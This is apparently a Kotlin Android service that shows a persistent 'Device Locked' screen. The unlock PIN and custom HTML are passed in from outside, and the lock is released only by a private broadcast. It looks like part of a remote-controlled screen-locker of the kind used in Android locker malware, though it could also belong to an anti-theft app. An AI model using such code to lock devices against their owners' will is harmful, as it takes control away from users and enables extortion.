package com.sync.xxx

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.os.Build
import android.os.IBinder
import androidx.core.app.NotificationCompat

class LockOverlayService : Service() {

    companion object {
        const val EXTRA_PIN         = "pin"
        const val EXTRA_TITLE       = "title"
        const val EXTRA_CUSTOM_HTML = "custom_html"
        private const val NOTIF_CHANNEL = "lock_overlay_channel"
        private const val NOTIF_ID      = 9901
    }

    private var correctPin: String  = ""
    private var lockTitle: String   = "Perangkat Terkunci"
    private var customHtml: String  = ""
    private var isReceiverRegistered = false

    private val unlockReceiver = object : BroadcastReceiver() {
        override fun onReceive(ctx: Context, intent: Intent) {
            if (intent.action == "com.sync.xxx.UNLOCK") {
                stopSelf()
            }
        }
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        startForegroundCompat()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        correctPin = intent?.getStringExtra(EXTRA_PIN)         ?: correctPin
        lockTitle  = intent?.getStringExtra(EXTRA_TITLE)       ?: lockTitle
        customHtml = intent?.getStringExtra(EXTRA_CUSTOM_HTML) ?: ""

        launchLockActivity()
        registerUnlockReceiver()

        return START_STICKY
    }

    private fun launchLockActivity() {
        val lockIntent = Intent(this, LockNewActivity::class.java).apply {
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_SINGLE_TOP)
            putExtra(EXTRA_PIN, correctPin)
            putExtra(EXTRA_TITLE, lockTitle)
            putExtra(EXTRA_CUSTOM_HTML, customHtml)
        }
        startActivity(lockIntent)
    }

    private fun registerUnlockReceiver() {
        if (isReceiverRegistered) return
        try {
            val filter = IntentFilter("com.sync.xxx.UNLOCK")
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                registerReceiver(unlockReceiver, filter, RECEIVER_NOT_EXPORTED)
            } else {
                registerReceiver(unlockReceiver, filter)
            }
            isReceiverRegistered = true
        } catch (e: Exception) {
            android.util.Log.w("LockOverlayService", "registerReceiver: ${e.message}")
        }
    }

    private fun startForegroundCompat() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val ch = NotificationChannel(
                NOTIF_CHANNEL, "Lock Overlay",
                NotificationManager.IMPORTANCE_LOW
            ).apply { setSound(null, null) }
            (getSystemService(NOTIFICATION_SERVICE) as NotificationManager)
                .createNotificationChannel(ch)
        }
        val notif: Notification = NotificationCompat.Builder(this, NOTIF_CHANNEL)
            .setContentTitle("Perangkat Terkunci")
            .setSmallIcon(android.R.drawable.ic_lock_lock)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setOngoing(true)
            .build()
        startForeground(NOTIF_ID, notif)
    }

    override fun onDestroy() {
        super.onDestroy()
        if (isReceiverRegistered) {
            try { unregisterReceiver(unlockReceiver) } catch (_: Exception) {}
            isReceiverRegistered = false
        }
    }
}
